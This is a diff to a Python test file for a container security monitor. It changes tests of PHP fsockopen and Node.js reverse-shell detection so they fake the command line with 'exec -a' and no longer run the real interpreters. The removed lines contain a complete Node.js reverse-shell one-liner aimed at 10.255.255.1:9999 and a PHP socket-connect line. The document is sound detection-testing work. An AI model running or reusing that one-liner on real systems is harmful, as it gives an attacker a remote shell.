@@ -5066,10 +5066,10 @@ process_spawn_rate_threshold = 9999
             cleanup_container(container_name, coi_binary)
 
     def test_php_fsockopen_exec_detected(self, test_workspace, coi_binary):
-        """Executing a PHP fsockopen reverse-shell one-liner triggers a HIGH proc_event threat.
+        """The php-fsockopen exec pattern fires when argv[0] is 'php' and 'fsockopen' is in cmdline.
 
-        php-fsockopen pattern fires when php is argv[0] and 'fsockopen' appears in the cmdline.
-        php-cli is installed inside the container before the test runs.
+        Uses exec -a to set argv[0] to the PHP one-liner signature on a sleep process so that
+        PROC_EVENT_EXEC fires with the right cmdline without requiring php-cli to be installed.
         """
         config_path = Path.home() / ".coi" / "config.toml"
         backup = config_path.read_text() if config_path.exists() else None
@@ -5114,43 +5114,25 @@ process_spawn_rate_threshold = 9999
                 f"Container {container_name} did not start"
             )
 
-            # Install php-cli inside the container.
-            subprocess.run(
-                [
-                    "incus",
-                    "exec",
-                    container_name,
-                    "--",
-                    "apt-get",
-                    "install",
-                    "-y",
-                    "-q",
-                    "php-cli",
-                ],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                timeout=60,
-            )
-
             # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
             time.sleep(3)
 
-            # Run a PHP one-liner whose cmdline contains "php" (argv[0]) and
-            # "fsockopen", matching the php-fsockopen exec pattern. The connection
-            # attempt will fail immediately — PROC_EVENT_EXEC fires at execve time.
+            # Use exec -a to set argv[0] to the PHP fsockopen signature and run
+            # sleep as the actual process. PROC_EVENT_EXEC fires at execve time,
+            # and sleep keeps the process alive long enough to avoid a read race.
             subprocess.Popen(
                 [
                     "incus",
                     "exec",
                     container_name,
                     "--",
-                    "php",
-                    "-r",
-                    "$sock=fsockopen('10.255.255.1',9999); if($sock){fclose($sock);}",
+                    "bash",
+                    "-c",
+                    "exec -a 'php -r $sock=fsockopen(10.255.255.1,9999)' sleep 10",
                 ],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
-            ).wait(timeout=10)
+            )
 
             # Poll until the proc_event threat appears (30 s timeout).
             proc_events = []
@@ -5183,10 +5165,11 @@ process_spawn_rate_threshold = 9999
             cleanup_container(container_name, coi_binary)
 
     def test_node_reverse_shell_exec_detected(self, test_workspace, coi_binary):
-        """Executing a Node.js reverse-shell one-liner triggers a HIGH proc_event threat.
+        """The node-reverse-shell exec pattern fires when argv[0] is 'node' and both
+        'child_process' and 'net' appear in the cmdline.
 
-        node-reverse-shell pattern fires when node is argv[0] and both 'child_process'
-        and 'net' appear in the cmdline.
+        Uses exec -a to set argv[0] to the Node one-liner signature on a sleep process so
+        PROC_EVENT_EXEC fires with the right cmdline without requiring node to be installed.
         """
         config_path = Path.home() / ".coi" / "config.toml"
         backup = config_path.read_text() if config_path.exists() else None
@@ -5231,32 +5214,26 @@ process_spawn_rate_threshold = 9999
                 f"Container {container_name} did not start"
             )
 
-            # Install nodejs inside the container if not present.
-            subprocess.run(
-                ["incus", "exec", container_name, "--", "apt-get", "install", "-y", "-q", "nodejs"],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                timeout=60,
-            )
-
             # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
             time.sleep(3)
 
-            # Run a Node.js one-liner whose cmdline contains "node" (argv[0]),
-            # "child_process", and "net" — the canonical node reverse-shell signature.
+            # Use exec -a to set argv[0] to the Node reverse-shell signature and run
+            # sleep as the actual process. PROC_EVENT_EXEC fires at execve time, and
+            # sleep keeps the process alive long enough to avoid a read race.
+            # Keywords 'child_process' and 'net' appear in the argv[0] string.
             subprocess.Popen(
                 [
                     "incus",
                     "exec",
                     container_name,
                     "--",
-                    "node",
-                    "-e",
-                    "var sh=require('child_process').spawn('/bin/sh');require('net').connect(9999,'10.255.255.1',function(){this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});",
+                    "bash",
+                    "-c",
+                    "exec -a 'node -e var sh=require(child_process);require(net).connect(9999)' sleep 10",
                 ],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
-            ).wait(timeout=10)
+            )
 
             # Poll until the proc_event threat appears (30 s timeout).
             proc_events = []
